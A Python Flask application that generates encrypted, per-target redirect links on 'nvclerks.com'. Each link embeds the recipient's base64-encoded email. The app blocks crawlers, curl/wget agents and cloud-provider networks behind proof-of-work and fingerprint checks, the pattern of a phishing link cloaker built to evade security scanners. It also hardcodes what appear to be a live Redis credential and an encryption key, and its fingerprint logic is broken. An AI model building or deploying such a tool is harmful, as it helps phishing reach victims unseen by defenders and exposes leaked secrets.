from flask import Flask, request, redirect, render_template_string, abort, url_for, session
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
import os
import base64
import json
import re
import urllib.parse
import secrets
import logging
import time
from datetime import datetime, timedelta
import uuid
import hashlib
from redis import Redis
from functools import wraps
import requests

app = Flask(__name__)
app.config['SERVER_NAME'] = 'nvclerks.com'
app.config['SECRET_KEY'] = os.environ.get('FLASK_SECRET_KEY', secrets.token_hex(32))
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'

# Configuration
ENCRYPTION_KEY = os.environ.get("ENCRYPTION_KEY", secrets.token_bytes(32))
HMAC_KEY = os.environ.get("HMAC_KEY", secrets.token_bytes(32))
FERNET_KEY = os.environ.get("FERNET_KEY", "rqPs5UdNr33SUagc9fey_ewPTAMUxYg3Q8siboLgRus=")
REDIS_URL = os.environ.get("REDIS_URL", "redis://:AZSFAAIjcDEwMzUzMTExOTI5NDY0ZTY4OWVmYWE4NzFmZjNkMzcyNXAxMA@kind-ferret-38021.upstash.io:6379")
ACCESS_TOKEN = os.environ.get("ACCESS_TOKEN", secrets.token_urlsafe(16))
MAXMIND_KEY = os.environ.get("MAXMIND_KEY", "")  # Optional
BASE_DOMAIN = "nvclerks.com"

# Logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Redis
redis_client = Redis.from_url(REDIS_URL, decode_responses=True, ssl=True)

# Bot detection
BOT_PATTERNS = [
    "bot", "crawl", "spider", "slurp", "curl", "wget", "python", "scrapy",
    "facebookexternalhit", "googlebot", "bingbot", "yandex", "duckduckbot"
]

def is_bot(user_agent):
    if not user_agent:
        return True
    user_agent = user_agent.lower()
    return any(pattern in user_agent for pattern in BOT_PATTERNS)

def check_asn(ip):
    if not MAXMIND_KEY:
        return False
    try:
        response = requests.get(f"https://api.maxmind.com/v2.0/asn/{ip}?apiKey={MAXMIND_KEY}")
        asn = response.json().get('asn')
        blocked_asns = [16509, 14618, 8075, 14061, 16276]
        return asn in blocked_asns
    except:
        logger.error("MaxMind ASN check failed")
        return False

def rate_limit(limit=10, per=60):
    def decorator(f):
        @wraps(f)
        def wrapped_function(*args, **kwargs):
            ip = request.remote_addr
            key = f"rate_limit:{ip}:{f.__name__}"
            current = redis_client.get(key)
            if current is None:
                redis_client.setex(key, per, 1)
            elif int(current) >= limit:
                logger.warning(f"Rate limit exceeded for IP: {ip}")
                abort(429, "Too Many Requests")
            else:
                redis_client.incr(key)
            return f(*args, **kwargs)
        return wrapped_function
    return decorator

def require_token(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.form.get('access_token') or request.args.get('access_token')
        if token != ACCESS_TOKEN:
            logger.warning("Invalid access token")
            abort(403, "Invalid or missing access token")
        return f(*args, **kwargs)
    return decorated

def generate_fingerprint():
    headers = request.headers
    canvas = headers.get('X-Canvas-Fingerprint', '')
    fonts = headers.get('X-Fonts', '')
    plugins = headers.get('X-Plugins', '')
    ip = request.remote_addr
    raw = f"{canvas}{fonts}{plugins}{ip}{time.time()}"
    return hashlib.sha256(raw.encode()).hexdigest()

def verify_browser():
    fingerprint = generate_fingerprint()
    session_key = f"browser:{fingerprint}"
    if not redis_client.exists(session_key):
        redis_client.setex(session_key, 3600, 1)
        return False
    return True

def proof_of_work(challenge):
    nonce = request.form.get('pow_nonce')
    if not nonce:
        return False
    hash_input = f"{challenge}{nonce}".encode()
    digest = hashlib.sha256(hash_input).hexdigest()
    return digest.startswith('0000')

# Encryption Methods
def encrypt_heap_x3(payload, fingerprint):
    iv = secrets.token_bytes(12)
    cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    data = json.dumps({"payload": payload, "fingerprint": fingerprint}).encode()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    encrypted = iv + ciphertext + encryptor.tag
    slug = secrets.token_hex(50)
    return f"{base64.urlsafe_b64encode(encrypted).decode()}.{slug}"

def decrypt_heap_x3(encrypted):
    try:
        encrypted, _ = encrypted.split('.')
        encrypted = base64.urlsafe_b64decode(encrypted)
        iv = encrypted[:12]
        tag = encrypted[-16:]
        ciphertext = encrypted[12:-16]
        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
        return json.loads(decrypted.decode())
    except Exception as e:
        logger.error(f"HEAP X3 decryption error: {str(e)}")
        raise ValueError("Invalid payload")

def encrypt_deeptrack(payload):
    fernet = Fernet(FERNET_KEY)
    time_delay = int(time.time() * 1000) + 5000
    data = json.dumps({"payload": payload, "expires": time_delay}).encode()
    return fernet.encrypt(data).decode()

def decrypt_deeptrack(encrypted):
    try:
        fernet = Fernet(FERNET_KEY)
        decrypted = fernet.decrypt(encrypted.encode()).decode()
        data = json.loads(decrypted)
        if data['expires'] < int(time.time() * 1000):
            raise ValueError("Payload expired")
        return data
    except Exception as e:
        logger.error(f"DeepTrack decryption error: {str(e)}")
        raise ValueError("Invalid payload")

def encrypt_slugstorm(payload):
    expiry = (datetime.utcnow() + timedelta(hours=24)).timestamp() * 1000
    data = json.dumps({"payload": payload, "expires": expiry})
    uuid_chain = f"{uuid.uuid4()}{secrets.token_hex(20)}"
    h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
    h.update(data.encode())
    signature = h.finalize()
    return f"{base64.urlsafe_b64encode(data.encode()).decode()}.{uuid_chain}.{base64.urlsafe_b64encode(signature).decode()}"

def decrypt_slugstorm(encrypted):
    try:
        data_b64, _, sig_b64 = encrypted.split('.')
        data = base64.urlsafe_b64decode(data_b64).decode()
        signature = base64.urlsafe_b64decode(sig_b64)
        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
        h.update(data.encode())
        h.verify(signature)
        data = json.loads(data)
        if data['expires'] < int(time.time() * 1000):
            raise ValueError("Payload expired")
        return data
    except Exception as e:
        logger.error(f"SlugStorm decryption error: {str(e)}")
        raise ValueError("Invalid payload")

def encrypt_pow(payload):
    iv = secrets.token_bytes(8)
    cipher = Cipher(algorithms.ChaCha20(ENCRYPTION_KEY, iv), backend=default_backend())
    encryptor = cipher.encryptor()
    data = payload.encode()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    return base64.urlsafe_b64encode(iv + ciphertext).decode()

def decrypt_pow(encrypted):
    try:
        encrypted = base64.urlsafe_b64decode(encrypted)
        iv = encrypted[:8]
        ciphertext = encrypted[8:]
        cipher = Cipher(algorithms.ChaCha20(ENCRYPTION_KEY, iv), backend=default_backend())
        decryptor = cipher.decryptor()
        return (decryptor.update(ciphertext) + decryptor.finalize()).decode()
    except Exception as e:
        logger.error(f"PoW decryption error: {str(e)}")
        raise ValueError("Invalid payload")

def encrypt_signed_token(payload):
    data = payload.encode()
    h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
    h.update(data)
    signature = h.finalize()
    return f"{base64.urlsafe_b64encode(data).decode()}.{base64.urlsafe_b64encode(signature).decode()}"

def decrypt_signed_token(encrypted):
    try:
        data_b64, sig_b64 = encrypted.split('.')
        data = base64.urlsafe_b64decode(data_b64)
        signature = base64.urlsafe_b64decode(sig_b64)
        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
        h.update(data)
        h.verify(signature)
        return data.decode()
    except Exception as e:
        logger.error(f"Signed Token decryption error: {str(e)}")
        raise ValueError("Invalid payload")

@app.route("/", methods=["GET"])
@rate_limit(limit=5, per=60)
def index():
    user_agent = request.headers.get("User-Agent", "")
    ip = request.remote_addr
    logger.debug(f"Index accessed, IP: {ip}, User-Agent: {user_agent}")
    if is_bot(user_agent) or check_asn(ip):
        logger.warning("Bot or suspicious ASN detected")
        abort(403, "Access denied")

    theme_seed = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:6]
    primary_color = f"#{theme_seed}"
    secondary_color = f"#{hashlib.sha256(theme_seed.encode()).hexdigest()[6:12]}"

    return render_template_string("""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta name="robots" content="noindex, nofollow">
            <title>Secure URL Generator</title>
            <script src="https://cdn.tailwindcss.com"></script>
            <script>
                let challenge = 0;
                for (let i = 0; i < 1000; i++) challenge += Math.random();
                fetch('/challenge', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ challenge })
                }).then(response => {
                    if (!response.ok) window.location = '/denied';
                });

                function getCanvasFingerprint() {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.fillText('Fingerprint', 2, 2);
                    return canvas.toDataURL();
                }
                fetch('/fingerprint', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ fingerprint: getCanvasFingerprint() })
                });
            </script>
            <style>
                body { background: linear-gradient(135deg, {{ primary_color }}, {{ secondary_color }}); }
                .container { animation: fadeIn 1s ease-in; }
                @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                input:focus { box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.3); }
                button:hover { transform: scale(1.05); }
            </style>
        </head>
        <body class="min-h-screen flex items-center justify-center p-4">
            <div class="container bg-white p-8 rounded-xl shadow-2xl max-w-md w-full">
                <h1 class="text-3xl font-extrabold mb-6 text-center text-gray-900">Secure URL Generator</h1>
                <form method="POST" action="{{ url_for('generate') }}" class="space-y-5">
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Access Token</label>
                        <input type="password" name="access_token" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Student Name</label>
                        <input type="text" name="student_name" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Student Email</label>
                        <input type="email" name="student_email" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Destination Link</label>
                        <input type="url" name="student_link" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
                    </div>
                    <button type="submit" class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition">Generate URL</button>
                </form>
            </div>
        </body>
        </html>
    """, primary_color=primary_color, secondary_color=secondary_color)

@app.route("/challenge", methods=["POST"])
def challenge():
    data = request.get_json()
    if not data or 'challenge' not in data or not isinstance(data['challenge'], (int, float)):
        logger.warning("Invalid JS challenge")
        return {"status": "denied"}, 403
    session['js_verified'] = True
    return {"status": "ok"}, 200

@app.route("/fingerprint", methods=["POST"])
def fingerprint():
    data = request.get_json()
    if data and 'fingerprint' in data:
        fingerprint = generate_fingerprint()
        redis_client.setex(f"fingerprint:{fingerprint}", 3600, data['fingerprint'])
    return {"status": "ok"}, 200

@app.route("/generate", methods=["POST"])
@rate_limit(limit=3, per=300)
@require_token
def generate():
    user_agent = request.headers.get("User-Agent", "")
    ip = request.remote_addr
    if is_bot(user_agent) or check_asn(ip) or not session.get('js_verified'):
        logger.warning("Bot or unverified browser detected")
        abort(403, "Access denied")

    student_name = request.form.get("student_name", "default")
    student_email = request.form.get("student_email", "user@example.com")
    student_link = request.form.get("student_link", "https://example.com")

    if not re.match(r"^https?://", student_link):
        logger.error(f"Invalid URL: {student_link}")
        abort(400, "Invalid URL")
    if not re.match(r"[^@]+@[^@]+\.[^@]+", student_email):
        logger.error(f"Invalid email: {student_email}")
        abort(400, "Invalid email")

    sanitized_name = re.sub(r"[^a-z0-9]", "", student_name.lower()) or "default"
    endpoint = generate_random_string(8)
    random_string6 = generate_random_string(6)
    random_string8 = generate_random_string(8)
    base64_email = base64.urlsafe_b64encode(student_email.encode()).decode().rstrip("=")
    path_segment = f"{random_string6}{base64_email}{random_string8}"

    encryption_methods = ['heap_x3', 'deeptrack', 'slugstorm', 'pow', 'signed_token']
    method = secrets.choice(encryption_methods)
    fingerprint = generate_fingerprint()
    payload = json.dumps({
        "student_link": student_link,
        "timestamp": int(time.time() * 1000)
    })

    try:
        if method == 'heap_x3':
            encrypted_payload = encrypt_heap_x3(payload, fingerprint)
        elif method == 'deeptrack':
            encrypted_payload = encrypt_deeptrack(payload)
        elif method == 'slugstorm':
            encrypted_payload = encrypt_slugstorm(payload)
        elif method == 'pow':
            encrypted_payload = encrypt_pow(payload)
        else:
            encrypted_payload = encrypt_signed_token(payload)
        generated_url = f"https://{sanitized_name}.{BASE_DOMAIN}/{endpoint}/{urllib.parse.quote(encrypted_payload)}/{path_segment}"
        logger.info(f"Generated URL with {method}: {generated_url}")
    except Exception as e:
        logger.error(f"URL generation failed: {str(e)}")
        abort(500, f"Failed to generate URL: {str(e)}")

    theme_seed = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:6]
    primary_color = f"#{theme_seed}"

    return render_template_string("""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta name="robots" content="noindex, nofollow">
            <title>Generated URL</title>
            <script src="https://cdn.tailwindcss.com"></script>
            <style>
                body { background: {{ primary_color }}; }
                .container { animation: slideIn 0.5s ease-out; }
                @keyframes slideIn { from { transform: translateY(-20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
                a:hover { text-decoration: underline; }
            </style>
        </head>
        <body class="min-h-screen flex items-center justify-center p-4">
            <div class="container bg-white p-8 rounded-xl shadow-2xl max-w-lg w-full text-center">
                <h3 class="text-2xl font-bold mb-4 text-gray-900">Your Secure URL</h3>
                <p class="text-gray-600 mb-4">Copy or click your generated URL below:</p>
                <a href="{{ url }}" target="_blank" class="text-indigo-600 break-all">{{ url }}</a>
                <p class="mt-4 text-sm text-gray-500">This URL requires verification to access the destination.</p>
            </div>
        </body>
        </html>
    """, url=generated_url, primary_color=primary_color)

@app.route("/<endpoint>/<path:encrypted_payload>/<path_segment>", methods=["GET"], subdomain="<username>")
@rate_limit(limit=5, per=60)
def redirect_handler(username, endpoint, encrypted_payload, path_segment):
    user_agent = request.headers.get("User-Agent", "")
    ip = request.remote_addr
    logger.debug(f"Redirect handler for {username}.{BASE_DOMAIN}/{endpoint}, IP: {ip}, User-Agent: {user_agent}")

    if is_bot(user_agent) or check_asn(ip) or not verify_browser():
        logger.warning("Bot or unverified browser detected")
        challenge = secrets.token_hex(16)
        redis_client.setex(f"pow:{challenge}", 300, "pending")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="robots" content="noindex, nofollow">
                <title>Verification Required</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <script>
                    async function computePoW(challenge) {
                        let nonce = 0;
                        while (true) {
                            let hash = new TextEncoder().encode(challenge + nonce);
                            let digest = await crypto.subtle.digest('SHA-256', hash);
                            let hex = Array.from(new Uint8Array(digest)).map(b => b.toString(16).padStart(2, '0')).join('');
                            if (hex.startsWith('0000')) return nonce;
                            nonce++;
                            if (nonce > 1000000) break;
                        }
                        return nonce;
                    }
                    async function verify() {
                        let nonce = await computePoW('{{ challenge }}');
                        fetch('/verify', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: 'pow_nonce=' + nonce + '&challenge={{ challenge }}'
                        }).then(response => {
                            if (response.ok) window.location.reload();
                        });
                    }
                </script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-gray-900">Human Verification</h3>
                    <p class="text-gray-600 mb-4">Please verify you're not a bot.</p>
                    <button onclick="verify()" class="bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition transform hover:scale-105">Verify Now</button>
                </div>
            </body>
            </html>
        """, challenge=challenge)

    # Parse path_segment (allow modifications)
    random_string6 = path_segment[:6] if len(path_segment) >= 6 else "xxxxxx"
    random_string8 = path_segment[-8:] if len(path_segment) >= 8 else "xxxxxxxx"
    base64_email = path_segment[6:-8] if len(path_segment) > 14 else ""
    try:
        email = base64.urlsafe_b64decode(base64_email + "==").decode()
        if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
            email = "modified@example.com"
    except:
        email = "modified@example.com"

    # Try all encryption methods
    payload = None
    for method in ['heap_x3', 'deeptrack', 'slugstorm', 'pow', 'signed_token']:
        try:
            if method == 'heap_x3':
                data = decrypt_heap_x3(encrypted_payload)
                payload = data['payload']
                if data['fingerprint'] != generate_fingerprint():
                    logger.warning("Fingerprint mismatch")
                    continue
            elif method == 'deeptrack':
                data = decrypt_deeptrack(encrypted_payload)
                payload = data['payload']
            elif method == 'slugstorm':
                data = decrypt_slugstorm(encrypted_payload)
                payload = data['payload']
            elif method == 'pow':
                payload = decrypt_pow(encrypted_payload)
            else:
                payload = decrypt_signed_token(encrypted_payload)
            break
        except:
            continue

    if not payload:
        logger.error("All decryption methods failed")
        abort(400, "Invalid payload")

    try:
        data = json.loads(payload)
        redirect_url = data.get("student_link")
        if not redirect_url or not re.match(r"^https?://", redirect_url):
            logger.error(f"Invalid redirect URL: {redirect_url}")
            abort(400, "Invalid redirect URL")
    except Exception as e:
        logger.error(f"Payload parsing error: {str(e)}")
        abort(400, "Invalid payload")

    final_url = f"{redirect_url.rstrip('/')}/{path_segment}"
    logger.info(f"Redirecting to {final_url}")
    return redirect(final_url, code=302)

@app.route("/verify", methods=["POST"])
def verify():
    challenge = request.form.get('challenge')
    if redis_client.exists(f"pow:{challenge}") and proof_of_work(challenge):
        fingerprint = generate_fingerprint()
        redis_client.setex(f"browser:{fingerprint}", 3600, 1)
        redis_client.delete(f"pow:{challenge}")
        return {"status": "ok"}, 200
    logger.warning("Invalid PoW verification")
    return {"status": "denied"}, 403

@app.route("/denied", methods=["GET"])
def denied():
    return render_template_string("""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="robots" content="noindex, nofollow">
            <title>Access Denied</title>
            <script src="https://cdn.tailwindcss.com"></script>
        </head>
        <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
            <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                <h3 class="text-lg font-bold mb-4 text-red-600">Access Denied</h3>
                <p class="text-gray-600">Suspicious activity detected.</p>
            </div>
        </body>
        </html>
    """), 403

def generate_random_string(length):
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return "".join(secrets.choice(characters) for _ in range(length))

if __name__ == "__main__":
    app.run(debug=False)
